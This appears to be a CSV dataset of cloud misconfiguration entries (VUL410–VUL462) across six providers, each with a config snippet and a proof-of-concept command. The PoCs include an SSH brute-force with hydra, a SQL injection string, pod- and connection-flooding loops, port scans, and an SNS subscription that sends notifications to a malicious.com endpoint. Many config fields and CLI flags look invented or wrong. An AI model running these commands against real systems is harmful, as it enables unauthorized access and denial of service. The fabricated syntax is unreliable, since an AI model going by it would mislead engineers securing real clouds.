id,description,category,cloud_provider,vulnerable_code,poc,source,timestamp
VUL410,Oracle Cloud VCN with misconfigured service gateway allowing lateral movement.,Network Security,Oracle Cloud,"{ ""serviceGateway"": { ""services"": [""all""] } }",nmap -p- internal-service-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:12:00Z
VUL411,IBM Cloud Kubernetes with misconfigured service account token allowing cluster compromise.,Privilege Escalation,IBM Cloud,"{ ""serviceAccount"": { ""automountToken"": true } }",kubectl get secret --all-namespaces | grep service-account,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:12:00Z
VUL412,Alibaba Cloud RDS with misconfigured parameter group allowing insecure connections.,Network Security,Alibaba Cloud,"{ ""Parameters"": [{ ""ParameterName"": ""require_secure_transport"", ""ParameterValue"": ""OFF"" }] }",mysql -h rds-endpoint -u user -p --ssl-mode=DISABLED,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:12:00Z
VUL413,AWS API Gateway with misconfigured authorizer allowing unauthorized access.,Authentication,AWS,"{ ""authorizerId"": null, ""authorizationType"": ""NONE"" }",curl https://api-id.execute-api.region.amazonaws.com/stage/endpoint,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:12:00Z
VUL414,Azure Cosmos DB with misconfigured role-based access control allowing privilege escalation.,Privilege Escalation,Azure,"{ ""roleAssignments"": [{ ""roleDefinitionName"": ""Cosmos DB Account Reader"", ""principalId"": ""*"" }] }",curl https://cosmosdb-account.documents.azure.com/dbs/db/colls/coll/docs,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cosmos-db'}",2025-06-19T11:12:00Z
VUL415,GCP Cloud Storage with misconfigured lifecycle rule exposing deleted objects.,Data Exposure,GCP,"gsutil lifecycle set lifecycle.json gs://bucket; lifecycle.json: {""rule"": []}",gsutil ls gs://bucket/deleted-object,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:12:00Z
VUL416,Oracle Cloud Database with misconfigured listener allowing SQL injection.,Injection,Oracle Cloud,"{ ""listener"": { ""sqlInjectionProtection"": false } }",sqlplus user/pass@db-endpoint:1521/service ' OR 1=1 --,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/managingDBsystem.htm'}",2025-06-19T11:12:00Z
VUL417,IBM Cloud Functions with misconfigured namespace allowing unauthorized access.,Access Control,IBM Cloud,"{ ""namespace"": { ""access"": ""public"" } }",ibmcloud fn action invoke namespace/action --result,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:12:00Z
VUL418,Alibaba Cloud OSS with misconfigured bucket ACL allowing data tampering.,Data Exposure,Alibaba Cloud,"{ ""AccessControlList"": { ""Grant"": ""public-read-write"" } }",aliyun oss cp malicious.txt oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:12:00Z
VUL419,AWS CloudTrail with misconfigured log delivery allowing log tampering.,Monitoring,AWS,"{ ""S3BucketName"": ""public-bucket"", ""LogFileValidationEnabled"": false }",aws s3 cp tampered.log s3://public-bucket/cloudtrail/,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/awscloudtrail'}",2025-06-19T11:12:00Z
VUL420,Azure Virtual Machine with misconfigured diagnostics exposing sensitive data.,Data Exposure,Azure,"{ ""diagnosticsProfile"": { ""publicAccess"": true } }",curl https://vm-diagnostic-endpoint/diagnostic-data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-machines'}",2025-06-19T11:12:00Z
VUL421,GCP Cloud Functions with misconfigured VPC connector allowing lateral movement.,Network Security,GCP,gcloud functions deploy fn --vpc-connector vpc-connector --egress-settings all,curl https://internal-service-ip,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:12:00Z
VUL422,Oracle Cloud Load Balancer with misconfigured path routing allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""pathRouteSet"": { ""rules"": [{ ""path"": ""/*"", ""backendSetName"": ""public-backend"" }] } }",curl https://lb-ip/private-endpoint,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:12:00Z
VUL423,IBM Cloud VPC with misconfigured subnet allowing unauthorized access.,Access Control,IBM Cloud,"{ ""subnet"": { ""access"": ""public"" } }",nmap -p- subnet-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:12:00Z
VUL424,Alibaba Cloud ECS with misconfigured security group allowing SSH brute force.,Authentication,Alibaba Cloud,"{ ""SecurityGroupRules"": [{ ""PortRange"": ""22/22"", ""SourceCidrIp"": ""0.0.0.0/0"" }] }",hydra -l admin -P passwords.txt ssh://ecs-ip,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25471.htm'}",2025-06-19T11:12:00Z
VUL425,AWS EKS with misconfigured pod security policy allowing container breakout.,Privilege Escalation,AWS,"{ ""podSecurityPolicy"": { ""privileged"": true } }",kubectl exec pod -- /bin/sh -c 'whoami',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:12:00Z
VUL426,Azure API Management with misconfigured backend allowing request forgery.,Server-Side Request Forgery,Azure,"{ ""backend"": { ""url"": ""http://internal-service"", ""validateCertificate"": false } }",curl https://api-management.azure-api.net?target=http://malicious.com,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:12:00Z
VUL427,GCP Cloud SQL with misconfigured backup allowing data exposure.,Data Exposure,GCP,gcloud sql backups create --instance=instance --public-access,gcloud sql backups describe backup-id --instance=instance,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:12:00Z
VUL428,Oracle Cloud Identity with misconfigured MFA policy allowing bypass.,Authentication,Oracle Cloud,"{ ""mfaPolicy"": { ""enabled"": false } }",oci iam user login --user-id user-id --no-mfa,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:12:00Z
VUL429,IBM Cloud Functions with misconfigured package binding allowing unauthorized access.,Access Control,IBM Cloud,"{ ""packageBinding"": { ""access"": ""public"" } }",ibmcloud fn package get package-name,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:12:00Z
VUL430,Alibaba Cloud OSS with misconfigured lifecycle transition allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""LifecycleConfiguration"": { ""Rule"": [{ ""StorageClass"": ""Archive"", ""PublicAccess"": true }] } }",aliyun oss ls oss://bucket/archived-file,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:12:00Z
VUL431,AWS SNS with misconfigured topic policy allowing unauthorized subscriptions.,Access Control,AWS,"{ ""TopicPolicy"": { ""Statement"": [{ ""Action"": ""sns:Subscribe"", ""Principal"": ""*"" }] } }",aws sns subscribe --topic-arn arn:aws:sns:region:account:topic --protocol http --notification-endpoint http://malicious.com,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:12:00Z
VUL432,Azure Event Hub with misconfigured capture allowing data exposure.,Data Exposure,Azure,"{ ""captureDescription"": { ""destination"": ""public-storage-account"" } }",curl https://storage-account.blob.core.windows.net/container/captured-data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/event-hubs'}",2025-06-19T11:12:00Z
VUL433,GCP BigQuery with misconfigured dataset policy allowing unauthorized access.,Access Control,GCP,"bq update --set_iam_policy '{""bindings"": [{""role"": ""roles/bigquery.dataOwner"", ""members"": [""allUsers""]}]}' dataset",bq query 'SELECT * FROM dataset.table',"{'cve': 'N/A', 'link': 'https://cloud.google.com/bigquery/docs'}",2025-06-19T11:12:00Z
VUL434,Oracle Cloud Object Storage with misconfigured bucket policy allowing data tampering.,Data Exposure,Oracle Cloud,"{ ""bucketPolicy"": { ""Statement"": [{ ""Action"": ""PutObject"", ""Principal"": ""*"" }] } }",oci os object put --bucket-name bucket --file malicious.txt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Object/Tasks/managingbuckets.htm'}",2025-06-19T11:12:00Z
VUL435,IBM Cloud Kubernetes with misconfigured init container allowing privilege escalation.,Privilege Escalation,IBM Cloud,"{ ""initContainers"": [{ ""image"": ""privileged-image"", ""privileged"": true }] }",kubectl exec init-pod -- /bin/sh -c 'whoami',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:12:00Z
VUL436,Alibaba Cloud ECS with misconfigured instance metadata allowing SSRF attacks.,Server-Side Request Forgery,Alibaba Cloud,"{ ""MetadataOptions"": { ""HttpEndpoint"": ""enabled"", ""HttpTokens"": ""optional"" } }",curl http://100.100.100.200/latest/meta-data/ --header 'Host: malicious.com',"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:12:00Z
VUL437,AWS CloudFormation with misconfigured parameter allowing code injection.,Code Injection,AWS,"{ ""Parameters"": { ""UserInput"": { ""Type"": ""String"", ""Default"": ""$(malicious-code)"" } } }",aws cloudformation deploy --template-file template.yaml --stack-name stack,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/cloudformation'}",2025-06-19T11:12:00Z
VUL438,Azure Machine Learning with misconfigured endpoint allowing inference attacks.,Data Exposure,Azure,"{ ""endpointConfig"": { ""publicAccess"": true } }",curl https://ml-workspace.region.api.azureml.ms/score?input=malicious,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/machine-learning'}",2025-06-19T11:12:00Z
VUL439,GCP Cloud Monitoring with misconfigured notification channel allowing data leakage.,Data Exposure,GCP,"gcloud monitoring channels create --channel-content='{""type"": ""webhook"", ""url"": ""http://public-endpoint""}'",curl http://public-endpoint,"{'cve': 'N/A', 'link': 'https://cloud.google.com/monitoring/docs'}",2025-06-19T11:12:00Z
VUL440,Oracle Cloud Functions with misconfigured environment variables exposing secrets.,Data Exposure,Oracle Cloud,"{ ""environmentVariables"": { ""API_KEY"": ""plain-text-key"" } }",oci fn function invoke --function-id fn-id --get-env,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Functions/Tasks/functions.htm'}",2025-06-19T11:12:00Z
VUL441,IBM Cloud VPC with misconfigured VPN gateway allowing traffic interception.,Network Security,IBM Cloud,"{ ""vpnGateway"": { ""publicAccess"": true } }",tcpdump -i eth0 host vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:12:00Z
VUL442,Alibaba Cloud RDS with misconfigured audit log destination allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""AuditLogConfig"": { ""destination"": ""public-bucket"" } }",aliyun oss ls oss://public-bucket/audit-logs,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:12:00Z
VUL443,AWS Redshift with misconfigured parameter group allowing insecure connections.,Network Security,AWS,"{ ""ParameterGroup"": [{ ""ParameterName"": ""require_ssl"", ""ParameterValue"": ""false"" }] }",psql -h redshift-endpoint -U user -d db -p 5439 --no-ssl,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/redshift'}",2025-06-19T11:12:00Z
VUL444,Azure Data Lake with misconfigured filesystem ACL allowing data tampering.,Data Exposure,Azure,"{ ""filesystemAcl"": { ""permissions"": [""read"", ""write""], ""principalId"": ""*"" } }",curl https://datalake.dfs.core.windows.net/filesystem/malicious.txt -X PUT,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/data-lake-store'}",2025-06-19T11:12:00Z
VUL445,GCP Cloud Composer with misconfigured Airflow DAG allowing code execution.,Code Injection,GCP,"{ ""dag"": { ""script"": ""exec('malicious-code')"" } }",curl https://airflow-ui.composer.region.cloud.google.com/dag/run,"{'cve': 'N/A', 'link': 'https://cloud.google.com/composer/docs'}",2025-06-19T11:12:00Z
VUL446,Oracle Cloud VCN with misconfigured DNS resolution allowing DNS rebinding attacks.,Network Security,Oracle Cloud,"{ ""dnsConfig"": { ""allowRebinding"": true } }",dig @vcn-dns malicious.com,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:12:00Z
VUL447,IBM Cloud Kubernetes with misconfigured webhook timeout allowing DoS attacks.,Denial of Service,IBM Cloud,"{ ""webhookTimeoutSeconds"": 0 }",for i in {1..1000}; do kubectl create pod --image=malicious-image; done,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:12:00Z
VUL448,Alibaba Cloud OSS with misconfigured event trigger allowing unauthorized invocation.,Access Control,Alibaba Cloud,"{ ""EventTrigger"": { ""destination"": ""public-function"" } }",aliyun fc invoke --function-name public-function,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:12:00Z
VUL449,AWS S3 bucket with misconfigured versioning exposing deleted objects.,Data Exposure,AWS,"{ ""VersioningConfiguration"": { ""Status"": ""Suspended"" } }",aws s3api list-object-versions --bucket bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:12:00Z
VUL450,Azure Stream Analytics with misconfigured output allowing data exfiltration.,Data Exfiltration,Azure,"{ ""output"": { ""type"": ""Blob"", ""storageAccount"": ""public-account"" } }",curl https://storage-account.blob.core.windows.net/container/output-data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/stream-analytics'}",2025-06-19T11:12:00Z
VUL451,GCP Cloud Armor with misconfigured XSS protection allowing script injection.,Injection,GCP,gcloud compute security-policies create policy --no-xss-protection,curl https://backend-service-ip?input=<script>malicious</script>,"{'cve': 'N/A', 'link': 'https://cloud.google.com/armor/docs'}",2025-06-19T11:12:00Z
VUL452,Oracle Cloud File Storage with misconfigured snapshot allowing data exposure.,Data Exposure,Oracle Cloud,"{ ""snapshotConfig"": { ""publicAccess"": true } }",oci fs snapshot get --snapshot-id snapshot-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:12:00Z
VUL453,IBM Cloud Databases with misconfigured connection pooling allowing resource exhaustion.,Denial of Service,IBM Cloud,"{ ""connectionPooling"": { ""maxConnections"": 1000 } }",for i in {1..1000}; do psql -h db-endpoint -U user -d db; done,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:12:00Z
VUL454,Alibaba Cloud ECS with misconfigured auto-scaling trigger allowing DoS attacks.,Denial of Service,Alibaba Cloud,"{ ""AutoScaling"": { ""Trigger"": { ""threshold"": 0 } } }",aliyun ess DescribeScalingActivities,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25857.htm'}",2025-06-19T11:12:00Z
VUL455,AWS ElastiCache with misconfigured cluster mode allowing unauthorized access.,Access Control,AWS,"{ ""ClusterMode"": { ""enabled"": true, ""accessControl"": null } }",redis-cli -h elasticache-endpoint -p 6379,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/elasticache'}",2025-06-19T11:12:00Z
VUL456,Azure Databricks with misconfigured cluster policy allowing privilege escalation.,Privilege Escalation,Azure,"{ ""clusterPolicy"": { ""permissions"": [""all""], ""principalId"": ""*"" } }",curl https://databricks-workspace.azuredatabricks.net/api/2.0/clusters/create,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/databricks'}",2025-06-19T11:12:00Z
VUL457,GCP Cloud VPN with misconfigured IKE policy allowing weak encryption.,Encryption,GCP,gcloud compute vpn-tunnels create tunnel --ike-version=1 --shared-secret=weak,nmap -p 500 vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.google.com/vpn/docs'}",2025-06-19T11:12:00Z
VUL458,Oracle Cloud Compute with misconfigured boot volume allowing data exposure.,Data Exposure,Oracle Cloud,"{ ""bootVolume"": { ""encryption"": false } }",oci bv volume get --volume-id volume-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:12:00Z
VUL459,IBM Cloud Functions with misconfigured action sequence allowing code execution.,Code Injection,IBM Cloud,"{ ""sequence"": [{ ""action"": ""exec('malicious-code')"" }] }",ibmcloud fn action invoke sequence-name --result,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:12:00Z
VUL460,Alibaba Cloud OSS with misconfigured encryption key allowing data exposure.,Encryption,Alibaba Cloud,"{ ""ServerSideEncryption"": { ""KMSKeyId"": ""weak-key"" } }",aliyun oss ls oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:12:00Z
VUL461,AWS CodeBuild with misconfigured source repository allowing code tampering.,Code Injection,AWS,"{ ""source"": { ""type"": ""GITHUB"", ""auth"": { ""type"": ""PERSONAL_ACCESS_TOKEN"", ""token"": ""exposed-token"" } } }",curl https://api.github.com/repos/repo/contents?access_token=exposed-token,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/codebuild'}",2025-06-19T11:12:00Z
VUL462,Azure Cognitive Services with misconfigured endpoint allowing data exfiltration.,Data Exfiltration,Azure,"{ ""endpointConfig"": { ""publicAccess"": true } }",curl https://cognitive-endpoint.api.cognitive.microsoft.com/data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cognitive-services'}",2025-06-19T11:12:00Z
